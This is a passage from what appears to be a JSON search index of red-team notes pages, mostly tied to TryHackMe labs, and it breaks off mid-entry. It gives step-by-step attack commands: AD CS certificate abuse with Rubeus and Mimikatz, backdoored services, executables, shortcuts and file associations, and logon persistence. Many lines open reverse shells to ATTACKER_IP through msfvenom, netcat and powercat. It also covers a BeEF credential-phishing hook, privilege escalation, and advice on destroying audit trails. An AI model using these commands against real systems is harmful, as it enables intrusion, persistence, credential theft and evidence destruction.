    "c": "Exploiting certificates  Active Directory Certificate Services (AD CS) is Microsoft’s PKI implementation. It is used in: Establishing trusts between domains Encryption Digital signatures Authentication Certificate templates allow an organization to offload the certificate request process to certain authorized users Finding vulnerable certificate templates  Use the RDP session on THMSERVER2 to enumerate certificate templates certutil -Template -v > .\\templates.txt A certificate template can be exploited if the following parameters are present: Client Authentication : Certificate can be used in client authentication CT_FLAG_ENROLEE_SUPPLIES_SUBJECT : Can specify an alternate SAN CTPRIVATEKEY_FLAG_EXPORTABLE_KEY : Can export the private key along with the certificate Certificate Permissions : User has the permissions to use the template SpecterOps mentions eight common security misconfigurations with AD CS, so it should be noted that there are still a significant amount of potential misconfigurations that can be found. Exploiting a Certificate Template  Using RDP access on THMSERVER2 , request a certificate. (If you use Remmina and save the config of the RDP connection, make sure to disable Restricted admin mode). Use the Microsoft Management Console (MMC): Click Start -> run Type mmc and hit enter Click File -> Add/Remove Snap-in.. Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts. Click OK Request a personal certificate: Right Click on Personal and select All Tasks->Request New Certificate… Click Next twice to select the AD enrollment policy. You will see that we have one template that we can request, but first, we need to provide additional information. Click on the More Information warning. Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add. Change the Alternative name Type option to User principal name. Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add. click Apply and OK. Select the certificate and click Enroll . You should be able to see your certificate. Export the certificate with the private key: Right-click on the certificate and select All Tasks -> Export… Click Next, select Yes, export the private key, and click Next. Click Next, then set a password for the certificate since the private key cannot be exported without a password. Click Next and select a location to store the certificate. Click Next and finally click Finish. User impersonation through a certificate  Use the certificate to request a Kerberos ticket-granting ticket (TGT) Load the Kerberos TGT into your hacking platform of choice Use Rubeus to Inject the Certificate C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\\Users\\username\\Desktop\\mycert.pfx /password:Password123 /outfile:pwn.kirbi /domain:za.tryhackme.loc /dc:10.200.60.101 Use Mimikatz to Pass-the-Ticket: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # privilege::debug mimikatz # kerberos::ptt pwn.kirbi mimikatz # misc::cmd C:> explorer.exe Browse the file system of the domain controller from THMSERVER2 .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "daba242b5cfd794d39131cf540e0fa02",
    "u": "https://ad.tymyrddin.dev/docs/exploit/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Connecting to the network  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<some assigned code>-exploitingad.ovpn --daemon Check PID (you get a number, if not, does not work): sudo ps aux | grep -v grep | grep -i <some assigned code>-exploitingad.ovpn | awk -v FS=' ' '{print $2}' Edit DNS configuration  Set your DNS IPv4 to the IP address of the THMCHILDDC in the network diagram (also add 1.1.1.1 for connections to the internet) and run: sudo systemctl restart NetworkManager Test hostname lookups  $ dig thmdc.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmdc.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 468 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmdc.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmdc.za.tryhackme.loc. 1200 IN A 10.200.60.101 ;; Query time: 40 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 14:15:34 GMT 2022 ;; MSG SIZE rcvd: 67 And: $ nslookup google.com ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Server: 1.1.1.1 Address: 1.1.1.1#53 Non-authoritative answer: Name: google.com Address: 216.58.214.78 ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out ;; communications error to 10.200.60.101#53: timed out Name: google.com Address: 2a00:1450:4007:818::200e Request credentials  Get your credentials from http://distributor.za.tryhackme.loc/creds . Jump in  You can now either login with ssh , for example: $ ssh za.tryhackme.loc\\\\<AD Username>@thmwrk1.za.tryhackme.loc Or by RDP: $ xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'<AD Username>' /p:'<AD Password>'",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e241dc2763e2a7bc478ba5ca986ebacd",
    "u": "https://fire.tymyrddin.dev/docs/persistence/services",
    "t": "Abusing services ",
    "c": "Abusing services  Creating backdoor services  Create and start a service named service using the following commands: sc.exe create <service> binPath= \"net user Administrator <password>\" start= auto sc.exe start <service> Note: There must be a space after each equal sign for the command to work. The net user command will be executed when the service is started, resetting the Administrator’s password to password . The service has been set to start automatically ( start= auto ), so that it runs without requiring user interaction. We can also create a reverse shell with msfvenom and associate it with the created service. Service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the exe-service format in msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe Copy the executable to the target system, say in C:\\Windows and point the service’s binPath to it: sc.exe create THMservice2 binPath= \"C:\\windows\\rev-svc.exe\" start= auto sc.exe start THMservice2 This creates a connection back to your attacker’s machine (if all went well). Modifying existing services  While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Any disabled service will be a good candidate, as it can be altered without the user noticing it. Get a list of available services: sc.exe query state=all Query the service’s configuration: sc.exe qc <service> For using a service for persistence: The executable BINARY_PATH_NAME points to the payload. The service START_TYPE is automatic so that the payload runs without user interaction. The SERVICE_START_NAME , which is the account under which the service will run, is preferably set to LocalSystem to gain SYSTEM privileges. Create a reverse shell with msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe Reconfigure the service parameters: sc.exe config <service> binPath= \"C:\\Windows\\rev-svc2.exe\" start= auto obj= \"LocalSystem\" Query the service’s configuration again to check all went as expected: sc.exe qc <service>",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cef5aed89d1710b69f174a5380f404fb",
    "u": "https://fire.tymyrddin.dev/docs/persistence/backdoor-files",
    "t": "Backdooring files ",
    "c": "Backdooring files  Another method of establishing persistence tampers with files we know users interact with regularly. We can plant backdoors that will get executed whenever the user accesses them. We do not want to create any alerts that could blow our cover, so the files we alter must keep working for the user as expected. There are many ways and files to plant backdoors in. These are the most commonly used ones. Executable Files  Any executable lying around the desktop are highly likely used frequently. Suppose we find a shortcut to PuTTY . Checking the shortcut’s properties, it probably points to C:\\Program Files\\PuTTY\\putty.exe . We could download the executable to our attacker’s machine and modify it to run any payload we wanted. To create a backdoored putty.exe : msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b \"\\x00\" -f exe -o puttyX.exe The binary will still work as usual and will execute an additional payload silently by adding an extra thread in the binary. The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Shortcut files  If we don’t want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally. For example, if there is a calc shortcut, find where it is pointing to by right-clicking it and going to properties. Create a Powershell script in C:\\Windows\\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut’s properties: Start-Process -NoNewWindow \"c:\\tools\\nc64.exe\" \"-e cmd.exe ATTACKER_IP 4445\" C:\\Windows\\System32\\calc.exe Save it as backdoor.ps1 , or perhaps something less conspicuous Change the shortcut to point to the script. Its icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run the script in a hidden window, for which we add the -windowstyle hidden option to Powershell. Making the final target of the shortcut: powershell.exe -WindowStyle hidden C:\\Windows\\System32\\backdoor.ps1 Enter target for calc shortcut in its properties window, don't forget to change the icon Start a netcat listener to receive the reverse shell: nc -nlvp 4445 Try it out by double-clicking the shortcut, see that there is a connection back to the attack machine, and that the user will get a calculator just as expected. There may be a command prompt flashing up and disappearing immediately on the screen. A regular user might not mind too much about that, maybe. Hijacking file associations  We can also hijack any file association to force the operating system to run a shell whenever the user opens a specific file type. The default operating system file associations are kept inside the registry, where a key is stored for every single file type under HKLM\\Software\\Classes\\ . Check for the .fileextension subkey and find which Programmatic ID (ProgID) is associated with it. Then search for a subkey for the corresponding ProgID (also under HKLM\\Software\\Classes\\ ), which will give a reference to the program in charge of handling its type of files. Most ProgID entries will have a subkey under shell\\open\\command where the default command to be run for files with that extension is specified. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. Powershell script, for example for notepad ( .txt extensions): Start-Process -NoNewWindow \"c:\\tools\\nc64.exe\" \"-e cmd.exe ATTACKER_IP 4448\" C:\\Windows\\system32\\NOTEPAD.EXE $args[0] Note: we have to pass $args[0] to notepad, as it will contain the name of the file to be opened, as given through %1 . Change the registry key to run our backdoor script in a hidden window (Data section), create a listener for the reverse shell and try to open any .txt file on the target machine.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "86f2acb3988a0c92bdfe259c85b8d801",
    "u": "https://fire.tymyrddin.dev/docs/enum/snmp",
    "t": "SNMP ",
    "c": "SNMP  If SNMP is available, it can hold a trove of information. A simple tool is snmp-check . On Kali, it can be found in the /usr/bin/snmp-check/ directory. $ snmp-check -h snmp-check v1.9 - SNMP enumerator Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org) Usage: snmp-check [OPTIONS] <target IP address> -p --port : SNMP port. Default port is 161; -c --community : SNMP community. Default is public; -v --version : SNMP version (1,2c). Default is 1; -w --write : detect write access (separate action by enumeration); -d --disable_tcp : disable TCP connections enumeration! -t --timeout : timeout in seconds. Default is 5; -r --retries : request retries. Default is 1; -i --info : show script version; -h --help : show help menu; For installing snmpcheck on a local Linux box, you need ruby installed, and: git clone https://gitlab.com/kalilinux/packages/snmpcheck.git cd snmpcheck/ gem install snmp chmod +x snmpcheck-1.9.rb",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "04f34d1fb3960d9a4188e3cfaf4459d6",
    "u": "https://fire.tymyrddin.dev/docs/phishing/beef-hook",
    "t": "Webpage with BeEF hook ",
    "c": "Webpage with BeEF hook  Attack tree  1 Test (AND) 1.1 Create index.html with basic beef hook in /var/www/html/ (AND) 1.2 Add basic beef hook script to it (AND) 1.3 Start apache2 server (AND) 1.4 Start BeEF (AND) 1.5 Go to URL with target machine (AND) 1.6 Watch IP address and info appear in beef (AND) 2 Inject hook in a page (AND) 2.1 Download site with webscrapbook (AND) 2.2 Extract downloaded archive and rename for easier use (AND) 2.3 Open a page (like index.html) (AND) 2.4 Add BeEF hook in <head> tag (AND) 2.5 Copy all code to apache2 webroot 3 Manipulate URL (AND) 3.1 Shorten 3.2 QR code 3.3 Obfuscate 4 Deliver link to target Example using BeEF  Start BeEF  On Kali, run ifconfig in a terminal and record the IP address. To run BeEF on Kali: cd /usr/share/beef-xss ./beef BeEF starts after a short time and displays the interfaces it is running on. For the interface that has the IP address of Kali, note the URLs of the Hook and the UI. The Hook is the malicious code you will call from a web page; the UI is the administrative console used by the attacker to control the victim’s system. 3. On Kali, launch a web browser and navigate to the user interface (UI) URL noted. 4. Log on with the username of beef and the password of beef. There are no online browsers listed on the left side of the screen. Create the malicious site  On Kali, launch a new terminal window (leave BeEF running in its own terminal) and type: service apache2 start After the Apache web server is started, use the folder list to navigate to the web page we wish to modify. 6. Navigate to Other Locations -> Computer -> var -> www -> html. 7. Right-click index.html and choose Open With Other Application. 8. Choose View All Applications and then highlight Text Editor. 9. Choose Select to open the web page in a text editor. 10. Once the file has opened, press Ctrl+A to highlight all the contents and then press Del on the keyboard to delete the contents. 11. Type the following text in the file to create a web page: <html> <head> <!-- Enter hook URL below, but before </head> --> </head> <body> <h1>Welcome to Website</h1> Welcome to our website. We have a number of services that can help you. </body> </html> Add the hook <head> <!-- Enter hook URL below, but before </head> --> <script src=\"http://<IP_OF_Kali>:3000/hook.js\" type=\"text/javascript\"></script> </head> Save and close Trick victim(s) into visiting site  Use social engineering attacks such as sending an email with the link, sending a text message with the link, or placing a link on another web page. From a different system in the lab, navigate to http://<ip_of_kali> to surf the website (normally you would be a trickster here). Switch back to Kali. While the user is connected to the company site, go back to the BeEF UI site, and see the client connected on the left side of your screen (if not, refresh the page). Click the Commands tab to see a list of commands you can send to the compromised system. In the Module Tree view all the different commands and exploits you can send to the visitor. Expand Social Engineering and then select Google Phishing Click the Execute button that appears on the right side of the screen. This causes a Google logon page to appear on the victim’s system. When the user logs on, the victim’s username and password are logged into the BeEF UI console. If you want the user to be redirected to a specific web page after the user attempts to log on, you could put the URL in an XSS hook URL field. Choose the command from the Module Results screen to see the username and password the user entered to log on to Google. Notes  Just the basics for testing how it works in the lab. If placing the hook in a big popular website, it is called a watering hole attack. Tools  BeEF in Kali WebScrapBook Domain obfuscator",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "272a8380ffbd5fd2e59fa481445db420",
    "u": "https://fire.tymyrddin.dev/docs/intel/mitre-attack",
    "t": "MITRE ATT&CK ",
    "c": "MITRE ATT&CK  MITRE ATT&CK is a knowledge base of adversary tactics and techniques based on real-world observations. The ATT&CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector, in government, and in the cybersecurity product and service community. To use the ATT&CK Navigator: navigate to the groups summary page, next to \"Techniques Used,\" navigate to \"ATT&CK Navigator Layers,\" from the dropdown navigate to \"view.\" An ATT&CK Navigator layer should have opened with the selected group's TTPs highlighted in a new tab. Resources  MITRE ATT&CK® Navigator",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ab5196bb6c5fdc4d8883d9998f7491c9",
    "u": "https://fire.tymyrddin.dev/docs/opsec/hide-your-tracks",
    "t": "Hide your tracks ",
    "c": "Hide your tracks  Noted methods used by hackers to hide their tracks: Encrypt keystrokes with tools such as Keyscrambler to prevent a keylogger from recording their IP address, Mac address, open ports, operating system, installed applications, default web browser, visited URLs, making screenshots … Create a locked screen saver to prevent live forensics Disable hibernation Disable and remove USB logs Disable time stamps Disable System Restore Points (Windows) Disable Debugging Upon Failure (Windows) Disable Event Logging (Windows) Disable sending error reports to third parties. Hide encrypted files in an encrypted container on a USB stick. Use SSH (Secure Shell) when connecting to a remote system. Use high anonymity proxies and VPN’s that do not log. Chain multiple proxies or chain VPN’s or use a VPN together with a high-anonymity proxy for an increased privacy advantage. Spoof and mimic a user-agent to hide the browsers’ identification. Destroy or alter audit trails to hide tracks of having been on a target. After a hack, delete any wireless network keys or passphrases, network share passwords and passwords for VPN or dial-up. After a hack, shred all related data, delete the entire hard drive, and install a fresh operating system from bootable disc or USB drive (erase and format the drive’s partitions) to return to normal function. Learn about Digital Forensics, keep up to date. …",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5162585e3e721ae2866f960fa27a9b84",
    "u": "https://fire.tymyrddin.dev/docs/enum/linux",
    "t": "Linux ",
    "c": "Linux  System  Linux distribution and release version: user@red-linux-enumeration:~$ ls /etc/*-release /etc/lsb-release /etc/os-release user@red-linux-enumeration:~$ cat /etc/os-release NAME=\"Ubuntu\" VERSION=\"20.04.4 LTS (Focal Fossa)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 20.04.4 LTS\" VERSION_ID=\"20.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=focal UBUNTU_CODENAME=focal Hostname: hostname Useful for password cracking (later) are /etc/passwd , /etc/group , and /etc/shadow . Any user can read the passwd and group files. The shadow password file requires root privileges. It contains the hashed passwords. Cracking the hashes, the original passwords are known. $ cat /etc/passwd $ cat /etc/group $ sudo cat /etc/shadow To find the installed applications: ls -lh /usr/bin/ ls -lh /sbin/ On an RPM-based Linux system, get a list of all installed packages with: rpm -qa On a Debian-based Linux system, get the list of installed packages with: dpkg -l Users  Files such as /etc/passwd reveal usernames, and various commands can provide more information and insights about other users on the system and their whereabouts. Who is logged in: who Current user effective (invoking) user id: whoami w shows who is logged in and what they are doing: w To print the real and effective (invoking) user and group IDS: id The allowed command for the invoking user on the current system: sudo -l A listing of the last logged-in users; who logged out and how long they stayed connected: user@red-linux-enumeration:~$ last user pts/0 10.9.1.191 Sat Oct 8 17:57 still logged in reboot system boot 5.4.0-120-generi Sat Oct 8 17:45 still running reboot system boot 5.4.0-120-generi Mon Jun 20 13:10 - 13:13 (00:02) randa pts/0 10.20.30.1 Mon Jun 20 11:00 - 11:01 (00:00) reboot system boot 5.4.0-120-generi Mon Jun 20 09:58 - 11:01 (01:03) Networking  IP adresses: ip a s The DNS servers can be found in the /etc/resolv.conf . netstat is a command for gathering information on network connections, routing tables, and interface statistics. user@red-linux-enumeration:~$ sudo netstat -lvanp -t | grep \"LISTEN\" [sudo] password for user: tcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN 615/named tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 722/slapd tcp 0 0 127.0.0.1:6667 0.0.0.0:* LISTEN 729/inspircd tcp 0 0 10.10.180.205:53 0.0.0.0:* LISTEN 615/named tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN 615/named tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 583/systemd-resolve tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 687/sshd: /usr/sbin tcp6 0 0 ::1:953 :::* LISTEN 615/named tcp6 0 0 :::389 :::* LISTEN 722/slapd tcp6 0 0 fe80::42:f5ff:fecd:d:53 :::* LISTEN 615/named tcp6 0 0 ::1:53 :::* LISTEN 615/named tcp6 0 0 :::21 :::* LISTEN 650/vsftpd tcp6 0 0 :::22 :::* LISTEN 687/sshd: /usr/sbin netstat -atupn will show All TCP and UDP listening and established connections and the program names with addresses and ports in numeric format. List Open Files (IPv4 and IPv6 listening services and ongoing connections): user@red-linux-enumeration:~$ sudo lsof -i [sudo] password for user: COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME chronyd 640 chrony 5u IPv4 16945 0t0 UDP localhost:323 chronyd 640 chrony 6u IPv6 16946 0t0 UDP localhost:323 sshd 978 root 3u IPv4 20035 0t0 TCP *:ssh (LISTEN) sshd 978 root 4u IPv6 20058 0t0 TCP *:ssh (LISTEN) master 1141 root 13u IPv4 20665 0t0 TCP localhost:smtp (LISTEN) master 1141 root 14u IPv6 20666 0t0 TCP localhost:smtp (LISTEN) dhclient 5638 root 6u IPv4 47458 0t0 UDP *:bootpc sshd 5693 peter 3u IPv4 47594 0t0 TCP rpm-red-enum.thm:ssh->10.20.30.113:38822 (ESTABLISHED) ... Limit the output to ports: sudo lsof -i :<port-number> Running services  In ps aux , the a and x are necessary when using BSD syntax as they lift the “only yourself” and “must have a tty” restrictions, and it becomes possible to display all processes. The u is for details about the user that has the process. user@red-linux-enumeration:~$ ps -aux | grep \"THM\" randa 659 0.0 0.0 2608 600 ? Ss 17:45 0:00 /bin/sh -c /home/randa/THM-24765.sh randa 677 0.0 0.3 6892 3204 ? S 17:45 0:00 /bin/bash /home/randa/THM-24765.sh user 1195 0.0 0.0 6432 724 pts/0 S+ 18:06 0:00 grep --color=auto THM Use ps axjf to print a process tree. The f stands for “forest”, and it creates an ASCII art process hierarchy: user@red-linux-enumeration:~$ ps axf PID TTY STAT TIME COMMAND 2 ? S 0:00 [kthreadd] 4 ? S< 0:00 \\_ [kworker/0:0H] 5 ? S 0:01 \\_ [kworker/u256:0] ... 978 ? Ss 0:00 /usr/sbin/sshd -D 5665 ? Ss 0:00 \\_ sshd: peter [priv] 5693 ? S 0:00 | \\_ sshd: peter@pts/1 5694 pts/1 Ss 0:00 | \\_ -bash 5713 pts/1 S+ 0:00 | \\_ vi notes.txt 5723 ? Ss 0:00 \\_ sshd: jane [priv] 5727 ? S 0:00 \\_ sshd: jane@pts/0 5728 pts/0 Ss 0:00 \\_ -bash 7080 pts/0 R+ 0:00 \\_ ps axf 979 ? Ssl 0:12 /usr/bin/python2 -Es /usr/sbin/tuned -l -P 981 ? Ssl 0:07 /usr/sbin/rsyslogd -n 1141 ? Ss 0:00 /usr/libexec/postfix/master -w 1147 ? S 0:00 \\_ qmgr -l -t unix -u 6991 ? S 0:00 \\_ pickup -l -t unix -u 1371 ? Ss 0:00 login -- root 1376 tty1 Ss 0:00 \\_ -bash 1411 tty1 S+ 0:00 \\_ man man 1420 tty1 S+ 0:00 \\_ less -s ...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0b8c0139dbc655fd1046216129ef7a00",
    "u": "https://fire.tymyrddin.dev/docs/phishing/phishing",
    "t": "Phishing overview ",
    "c": "Phishing overview  Attack tree  1 Gather information (Reconnaissance) (AND) 2 Clone website with a tool like cURL, Invoke-WebRequest (powershell), or webscrapbook (AND) 3 Add payload (AND) 3.1 Change login page to a credential stealing script (OR) 3.2 Implant a malware (Crypted and packed) 2 Use email, sms, phone, to persuade a person to go to the site Notes  Email phishing  An adversary poses as a legitimate and trusted business using a similar look and feel to regular email notifications to trick users into clicking on a link that takes them a phony website or access portal designed to look like the legitimate company website. Victims are then prompted to enter personal information ranging from login names and passwords to social security numbers, birthdates, account numbers, and other highly sensitive data. Email phishing is popular because of the easy access to databases containing millions of active email addresses, providing potential victims with relatively little risk and almost no cost. Spear phishing  Spear phishing refers to a phishing attack that targets a specific person. In so-called spear phishing an adversary creates an email message that appears to be from a trusted sender, the tone of the email way more informal than in a phishing attack, and usually contains some sort of emergency with a request for help, in such a way that a quick, instinctive action is required to help the other (before thinking can intervene). With personal information shared on social networking sites (first and last name, names of family members, and employers), spear-phishing is easier than ever. Smishing  Short message service (SMS) phishing, also known as smishing, is a phishing attack conducted through text messaging instead of email. Vishing  Vishing refers to phishing attacks that use voice over the phone instead of email. Whaling  Whaling refers to a phishing attack that targets the “big fish” of a company, such as the CEO. The victim is researched more thoroughly with reconnaissance and lured with a fake document from, for example, the tax office, and state that the opening of the document requires the installation of some “security software”, or something similar.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9da333f0da9116a186c0d50d81eeac42",
    "u": "https://fire.tymyrddin.dev/docs/persistence/logon",
    "t": "Logon triggered persistence ",
    "c": "Logon triggered persistence  Windows operating systems present several ways to link payloads with particular interactions. Startup folder  Every user has a Startup folder: C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup where each user can put executables to be run whenever they log in. Each user will only run whatever is available in their folder. An attacker can achieve persistence just by dropping a payload in there. If we want to force all users to run a payload while logging in, we can use the folder: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp Generate a reverse shell payload using msfvenom : msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe Copy the payload into the target machine by spawning an http.server with Python and using wget on the target machine to download the file. Start listener on port 4450. Store it in the C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp folder to get a shell back for any user logging into the machine: copy revshell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\" Sign out of the session from the start menu (closing an RDP window is not enough as it leaves the session open), and log back in via RDP to receive a connection back to the attack machine. Run/RunOnce  Instead of delivering a payload into a specific directory, you can also use the following registry entries to specify applications to run at logon: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time. Create a reverse shell with msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe After transferring it to the victim machine, move it to C:\\Windows\\ : move revshell.exe C:\\Windows Create a REG_EXPAND_SZ registry entry under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run . The entry’s name can be anything, and the value is the command we want to execute. Start a listener, sign out of the current session and log in again, and you should receive a shell. Winlogon  Another alternative to automatically start programs on logon is abusing Winlogon , the Windows component that loads a user’s profile right after authentication (amongst other things). Winlogon uses some registry keys under HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ that can be used to gain persistence: Userinit points to userinit.exe , which is in charge of restoring your user profile preferences. shell points to the system’s shell, which is usually explorer.exe . Replacing any of the executables with a reverse shell break sthe logon sequence, but you can append commands separated by a comma, and Winlogon will process them all. Logon scripts  One of the things userinit.exe does while loading a user profile is to check for an environment variable called UserInitMprLogonScript . We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable is not set by default, so we can just create it and assign any script we like. Create a reverse shell, put it anywhere, create an environment variable for a user, go to its HKCU\\Environment in the registry. Use the UserInitMprLogonScript entry to point to the payload for it to get loaded when the user logs in. Set up a listener, sign out of the current session and log in again.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8a1d4403948fe94430f9ca4d554d6f6f",
    "u": "https://fire.tymyrddin.dev/docs/enum/tools",
    "t": "More Windows tools ",
    "c": "More Windows tools  Sysinternals Suite  The Sysinternals Suite is a group of command-line and GUI utilities and tools that provides information about aspects related to the Windows system. Process Hacker  Process Hacker gives detailed information regarding running processes, related active network connections, and insight into system resource utilisation from CPU and memory to disk and network. GhostPack Seatbelt  Seatbelt is part of the GhostPack collection, and is written in C#. It is not released in binary form. You are expected to compile it yourself .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4df6ae38f978ea409c45b0b637fbbac1",
    "u": "https://fire.tymyrddin.dev/docs/weapons/psh",
    "t": "Powershell ",
    "c": "Powershell  Open a text editor and enter: Write-Output \"something\" Save the file with a .PS1 extension and execute it from the cmd: powershell -File scriptname.ps1 Execution policy  To check if we are restricted: Get-ExecutionPolicy If so, change it with: Set-ExecutionPolicy -Scope CurrentUser RemoteSigned Or bypass restrictions when executing the script: powershell -ex bypass -File scriptname.ps1 Reverse shell  We can use powercat. Set up a listener on the attack machine: nc -lvp 443 Launch powercat: powershell -c \"powercat -c ATTACKING-MACHINE-IPP -p 443 -e cmd\" We get a shell.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "77cc9f9772ee0e9288655d9c4642ae0a",
    "u": "https://fire.tymyrddin.dev/docs/escalation/quick",
    "t": "Quick misconfiguration wins ",
    "c": "Quick misconfiguration wins  Attack tree  1 Escalate through misconfigurations 1.1 Scheduled tasks (OR) 1.2 AlwaysInstallElevated Examples  Scheduled tasks  List scheduled tasks: C:\\> schtasks /query /tn vulntask /fo list /v Folder: \\ HostName: THM-PC1 TaskName: \\vulntask Task To Run: C:\\tasks\\schtask.bat Run As User: taskusr1 ... The Task To Run is of interest. If the current user can modify or overwrite the executable, we can control what gets executed by the taskusr1 user, giving a simple privilege escalation. Check the file permissions on the executable: C:\\> icacls c:\\tasks\\schtask.bat c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(F) In this case, the BUILTIN\\Users group has full access (F) over the task’s binary. This means we can modify the .bat file and insert any payload. Change the .bat file to spawn a reverse shell: C:\\> echo c:\\tools\\nc64.exe -e cmd.exe <IP address attack machine> 4444 > C:\\tasks\\schtask.bat And start a listener on the attack machine: nc -lvp 4444 The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. Depending on when the task is scheduled to run, this may take a looong time. AlwaysInstallElevated  Query the registry values: C:\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer C:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer Both should be set for this exploitation to work. Generate an evil .msi file using msfvenom : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=<port-number> -f msi -o evil.msi Run the Metasploit Handler module configured accordingly. Transfer the file to C:\\Windows\\Temp on the target machine. Run the installer with the command below and receive the reverse shell: C:\\> msiexec /quiet /qn /i C:\\Windows\\Temp\\evil.msi Notes  These belong more to the realm of CTF events rather than real world scenarios. Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it’s using a binary you can modify. Windows installer files ( .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. And they can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow for generating a malicious .msi file that would run with admin privileges.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "daf7f19bac5fff711b8309f12ed51370",
    "u": "https://fire.tymyrddin.dev/docs/pivot/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Move around the network while creating as few alerts as possible. From one system taking over another. Why?  To have alternatives to find the best path to take. For example, if another system is untouchable or more secure or if the first was not compromised. How?  Mythical blue lake (active directory hacks) writeups.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "60ad529e11a4a15d38fb2de55fe598b7",
    "u": "https://fire.tymyrddin.dev/docs/escalation/privileges",
    "t": "Abusing dangerous privileges ",
